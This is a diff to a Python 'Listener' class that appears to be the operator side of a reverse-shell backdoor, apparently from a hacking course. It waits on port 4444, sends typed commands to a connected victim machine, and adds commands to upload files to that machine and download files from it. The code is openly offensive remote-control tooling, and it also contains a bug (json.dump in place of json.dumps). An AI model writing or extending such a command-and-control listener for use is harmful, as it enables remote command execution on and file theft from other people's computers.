@@ -11,7 +11,7 @@ class Listener:
         print("[+] Connection Successful from " + str(address))
     
     def safe_send(self, data):
-        self.connection.send(json.dump(data))
+        self.connection.send(json.dump(data).encode())
     
     def safe_receive(self):
         json_data = ""
@@ -33,18 +33,29 @@ class Listener:
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
-            return "[+] File Was Download Successfuly"
+            return "[+] File Was Uploaded Successfuly"
+    
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
         
     def run(self):
         while True:
             command = input(">> ")
             command = command.split(" ")
-            command_result = self.execute_commands(command)
-            if command[0] == "download":
-                message = self.write_file(command[1], command_result)
-                print(message)
-            else:
-                print(command_result)
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1]).decode()
+                    command.append(file_content)
+
+                command_result = self.execute_commands(command)
+
+                if command[0] == "download" and "[-] Command" not in command_result:
+                    command_result = self.write_file(command[1], command_result)
+            except Exception:
+                command_result = "[-] Error"
+            
+            print(command_result)
 
 my_listener = Listener("192.168.1.5", 4444)
 my_listener.run()
